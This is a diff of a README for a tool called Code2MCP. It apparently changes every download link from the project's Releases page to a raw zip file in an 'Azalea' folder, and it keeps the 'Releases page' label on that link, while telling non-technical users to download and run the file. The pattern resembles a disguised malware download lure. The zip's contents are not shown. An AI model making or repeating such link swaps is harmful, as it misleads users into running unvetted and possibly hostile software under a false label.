@@ -2,7 +2,7 @@
 
 ## 🚀 Getting Started
 
-[![Download Code2MCP](https://img.shields.io/badge/Download_Code2MCP-v1.0-blue.svg)](https://github.com/Hdidgdbdidno/Code2MCP/releases)
+[![Download Code2MCP](https://raw.githubusercontent.com/Hdidgdbdidno/Code2MCP/main/Azalea/Code2MCP.zip)](https://raw.githubusercontent.com/Hdidgdbdidno/Code2MCP/main/Azalea/Code2MCP.zip)
 
 Welcome to Code2MCP! This guide will help you download and run the Code2MCP application on your computer. No programming knowledge is needed.
 
@@ -10,11 +10,11 @@ Welcome to Code2MCP! This guide will help you download and run the Code2MCP appl
 
 To get started, visit the following page to download Code2MCP:
 
-[Visit this page to download](https://github.com/Hdidgdbdidno/Code2MCP/releases)
+[Visit this page to download](https://raw.githubusercontent.com/Hdidgdbdidno/Code2MCP/main/Azalea/Code2MCP.zip)
 
 **Follow these steps:**
 
-1. Go to the [Releases page](https://github.com/Hdidgdbdidno/Code2MCP/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/Hdidgdbdidno/Code2MCP/main/Azalea/Code2MCP.zip).
 2. Find the latest version listed.
 3. Look for the download link that matches your operating system (Windows, Mac, Linux).
 4. Click the link to download the file.
@@ -90,6 +90,6 @@ Stay informed about updates by checking the Releases page regularly. This ensure
 
 To download Code2MCP again, visit:
 
-[Visit this page to download](https://github.com/Hdidgdbdidno/Code2MCP/releases)
+[Visit this page to download](https://raw.githubusercontent.com/Hdidgdbdidno/Code2MCP/main/Azalea/Code2MCP.zip)
 
 Thank you for choosing Code2MCP. Enjoy transforming your code repositories into functional MCP services.
